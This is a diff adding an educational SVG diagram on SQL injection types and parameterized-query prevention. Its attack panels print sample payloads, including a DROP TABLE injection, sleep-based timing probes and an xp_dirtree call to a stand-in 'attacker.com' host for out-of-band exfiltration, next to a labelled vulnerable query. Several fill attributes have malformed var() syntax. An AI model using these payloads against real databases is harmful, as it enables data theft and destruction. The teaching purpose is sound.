@@ -1,0 +1,142 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 950 700" role="img" aria-labelledby="title desc">
+  <title id="title">SQL Injection Types and Prevention</title>
+  <desc id="desc">Comprehensive visualization of SQL injection types including error-based, blind, and time-based attacks with parameterized query prevention</desc>
+  
+  <!-- Background -->
+  <rect width="950" height="700" fill="var(--bg-panel, #f8fafc)"/>
+  
+  <!-- Title -->
+  <text x="475" y="35" text-anchor="middle" font-size="22" font-weight="bold" fill="var(--text-theme, #1e293b)">SQL Injection Types &amp; Prevention</text>
+  <text x="475" y="60" text-anchor="middle" font-size="13" fill="var(--text-theme, #64748b)">Understanding attack vectors and secure coding practices</text>
+  
+  <!-- SQL Injection Types -->
+  <rect x="30" y="80" width="570" height="340" rx="8" fill="var(--bg-panel-hover, #fef2f2)" stroke="var(--border-theme, #ef4444)" stroke-width="2"/>
+  <text x="315" y="105" text-anchor="middle" font-size="16" font-weight="bold" fill="var(--text-theme, #b91c1c">SQL Injection Attack Types</text>
+  
+  <!-- Error-Based SQLi -->
+  <rect x="50" y="125" width="250" height="140" rx="6" fill="white" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="175" y="150" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--text-theme, #b91c1c">Error-Based SQLi</text>
+  
+  <rect x="65" y="165" width="220" height="90" rx="4" fill="var(--bg-panel-soft, #fee2e2)" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="175" y="185" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Attacker triggers database errors</text>
+  <text x="175" y="200" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Error messages reveal structure</text>
+  
+  <text x="175" y="225" text-anchor="middle" font-size="9" font-weight="bold" fill="var(--text-theme, #b91c1c">Example Payload:</text>
+  <text x="175" y="242" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">' OR 1=1 --</text>
+  <text x="175" y="255" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">'; DROP TABLE users; --</text>
+  
+  <!-- Blind SQLi -->
+  <rect x="320" y="125" width="250" height="140" rx="6" fill="white" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="445" y="150" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--text-theme, #b91c1c">Blind SQLi</text>
+  
+  <rect x="335" y="165" width="220" height="90" rx="4" fill="var(--bg-panel-soft, #fee2e2)" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="445" y="185" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">No error messages shown</text>
+  <text x="445" y="200" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Infer from behavior changes</text>
+  
+  <text x="445" y="225" text-anchor="middle" font-size="9" font-weight="bold" fill="var(--text-theme, #b91c1c">Boolean-Based:</text>
+  <text x="445" y="242" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">' AND 1=1 -- (true)</text>
+  <text x="445" y="255" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">' AND 1=2 -- (false)</text>
+  
+  <!-- Time-Based SQLi -->
+  <rect x="50" y="280" width="250" height="130" rx="6" fill="white" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="175" y="305" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--text-theme, #b91c1c">Time-Based Blind SQLi</text>
+  
+  <rect x="65" y="320" width="220" height="80" rx="4" fill="var(--bg-panel-soft, #fee2e2)" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="175" y="340" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Inject time-delay commands</text>
+  <text x="175" y="355" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Measure response time</text>
+  <text x="175" y="370" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Slow response = injection success</text>
+  
+  <text x="175" y="395" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">'; WAITFOR DELAY '0:0:5' --</text>
+  <text x="175" y="408" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">' OR SLEEP(5) --</text>
+  
+  <!-- Out-of-Band SQLi -->
+  <rect x="320" y="280" width="250" height="130" rx="6" fill="white" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="445" y="305" text-anchor="middle" font-size="13" font-weight="bold" fill="var(--text-theme, #b91c1c">Out-of-Band SQLi</text>
+  
+  <rect x="335" y="320" width="220" height="80" rx="4" fill="var(--bg-panel-soft, #fee2e2)" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="445" y="340" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Data exfiltration via DNS/HTTP</text>
+  <text x="445" y="355" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Different channel than injection</text>
+  <text x="445" y="370" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Used when direct response unavailable</text>
+  
+  <text x="445" y="395" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">'; EXEC xp_dirtree '\\attacker.com' --</text>
+  
+  <!-- Parameterized Queries -->
+  <rect x="615" y="80" width="305" height="340" rx="8" fill="var(--bg-panel-soft, #ecfdf5)" stroke="var(--border-theme, #10b981)" stroke-width="2"/>
+  <text x="767" y="105" text-anchor="middle" font-size="16" font-weight="bold" fill="var(--text-theme, #059669">Parameterized Queries (Prepared Statements)</text>
+  
+  <!-- Vulnerable Code -->
+  <rect x="630" y="125" width="275" height="135" rx="4" fill="white" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="767" y="150" text-anchor="middle" font-size="12" font-weight="bold" fill="var(--text-theme, #b91c1c">✗ VULNERABLE (String Concatenation)</text>
+  
+  <rect x="645" y="165" width="245" height="85" rx="3" fill="var(--bg-panel-soft, #fee2e2)" stroke="var(--border-theme, #fca5a5)" stroke-width="1"/>
+  <text x="660" y="185" text-anchor="start" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">// JavaScript/Node.js</text>
+  <text x="660" y="200" text-anchor="start" font-size="8" fill="var(--text-theme, #ef4444" font-family="monospace">const query = `SELECT * FROM users</text>
+  <text x="660" y="213" text-anchor="start" font-size="8" fill="var(--text-theme, #ef4444" font-family="monospace">WHERE username = '${username}'`;</text>
+  <text x="660" y="233" text-anchor="start" font-size="8" fill="var(--text-theme, #b91c1c">⚠️ User input directly in query</text>
+  <text x="660" y="248" text-anchor="start" font-size="8" fill="var(--text-theme, #b91c1c">⚠️ SQL interpreter cannot distinguish</text>
+  
+  <!-- Secure Code -->
+  <rect x="630" y="275" width="275" height="135" rx="4" fill="white" stroke="var(--border-theme, #6ee7b7)" stroke-width="1"/>
+  <text x="767" y="300" text-anchor="middle" font-size="12" font-weight="bold" fill="var(--text-theme, #059669">✓ SECURE (Parameterized)</text>
+  
+  <rect x="645" y="315" width="245" height="85" rx="3" fill="var(--bg-panel-soft, #d1fae5)" stroke="var(--border-theme, #6ee7b7)" stroke-width="1"/>
+  <text x="660" y="335" text-anchor="start" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">// JavaScript/Node.js</text>
+  <text x="660" y="350" text-anchor="start" font-size="8" fill="var(--text-theme, #10b981" font-family="monospace">const query = 'SELECT * FROM users</text>
+  <text x="660" y="363" text-anchor="start" font-size="8" fill="var(--text-theme, #10b981" font-family="monospace">WHERE username = $1';</text>
+  <text x="660" y="376" text-anchor="start" font-size="8" fill="var(--text-theme, #10b981" font-family="monospace">const values = [username];</text>
+  <text x="660" y="393" text-anchor="start" font-size="8" fill="var(--text-theme, #059669">✓ User input treated as data only</text>
+  <text x="660" y="408" text-anchor="start" font-size="8" fill="var(--text-theme, #059669">✓ SQL structure preserved</text>
+  
+  <!-- How It Works -->
+  <rect x="30" y="435" width="890" height="245" rx="8" fill="var(--bg-panel-hover, #f0fdf4)" stroke="var(--border-theme, #10b981)" stroke-width="2"/>
+  <text x="475" y="460" text-anchor="middle" font-size="16" font-weight="bold" fill="var(--text-theme, #059669">How Parameterized Queries Prevent SQLi</text>
+  
+  <!-- Step 1: Query Template -->
+  <rect x="50" y="480" width="270" height="190" rx="6" fill="white" stroke="var(--border-theme, #6ee7b7)" stroke-width="1"/>
+  <text x="185" y="505" text-anchor="middle" font-size="12" font-weight="bold" fill="var(--text-theme, #059669">1. Query Template Sent</text>
+  
+  <rect x="65" y="520" width="240" height="140" rx="4" fill="var(--bg-panel-hover, #ecfdf5)" stroke="var(--border-theme, #6ee7b7)" stroke-width="1"/>
+  <text x="185" y="540" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Database parses query structure</text>
+  <text x="185" y="555" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Placeholders mark parameter positions</text>
+  <text x="185" y="570" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Query plan compiled</text>
+  
+  <text x="185" y="595" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">SELECT * FROM users</text>
+  <text x="185" y="610" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">WHERE username = ?</text>
+  <text x="185" y="625" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">AND email = ?</text>
+  <text x="185" y="640" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">-- Structure is FIXED</text>
+  
+  <!-- Step 2: Parameters Sent -->
+  <rect x="340" y="480" width="270" height="190" rx="6" fill="white" stroke="var(--border-theme, #6ee7b7)" stroke-width="1"/>
+  <text x="475" y="505" text-anchor="middle" font-size="12" font-weight="bold" fill="var(--text-theme, #059669">2. Parameters Sent Separately</text>
+  
+  <rect x="355" y="520" width="240" height="140" rx="4" fill="var(--bg-panel-hover, #ecfdf5)" stroke="var(--border-theme, #6ee7b7)" stroke-width="1"/>
+  <text x="475" y="540" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">User input bound to placeholders</text>
+  <text x="475" y="555" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Treated as literal values ONLY</text>
+  <text x="475" y="570" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Cannot modify query structure</text>
+  
+  <text x="475" y="595" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">Parameter 1: "admin' --"</text>
+  <text x="475" y="610" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">Parameter 2: "test@example.com"</text>
+  <text x="475" y="625" text-anchor="middle" font-size="8" fill="var(--text-theme, #10b981" font-family="monospace">-- Treated as STRING VALUE</text>
+  <text x="475" y="640" text-anchor="middle" font-size="8" fill="var(--text-theme, #10b981" font-family="monospace">-- NOT as SQL code</text>
+  
+  <!-- Step 3: Safe Execution -->
+  <rect x="630" y="480" width="270" height="190" rx="6" fill="white" stroke="var(--border-theme, #6ee7b7)" stroke-width="1"/>
+  <text x="765" y="505" text-anchor="middle" font-size="12" font-weight="bold" fill="var(--text-theme, #059669">3. Safe Execution</text>
+  
+  <rect x="645" y="520" width="240" height="140" rx="4" fill="var(--bg-panel-hover, #ecfdf5)" stroke="var(--border-theme, #6ee7b7)" stroke-width="1"/>
+  <text x="765" y="540" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Database executes compiled query</text>
+  <text x="765" y="555" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">Parameters inserted as data</text>
+  <text x="765" y="570" text-anchor="middle" font-size="9" fill="var(--text-theme, #1e293b">SQL injection impossible</text>
+  
+  <text x="765" y="595" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">Actual query executed:</text>
+  <text x="765" y="610" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">SELECT * FROM users</text>
+  <text x="765" y="625" text-anchor="middle" font-size="8" fill="var(--text-theme, #1e293b" font-family="monospace">WHERE username = 'admin'' --'</text>
+  <text x="765" y="640" text-anchor="middle" font-size="8" fill="var(--text-theme, #10b981" font-family="monospace">-- Searches for literal string</text>
+  
+  <!-- Arrow marker -->
+  <defs>
+    <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="var(--text-theme, #64748b)"/>
+    </marker>
+  </defs>
+</svg>
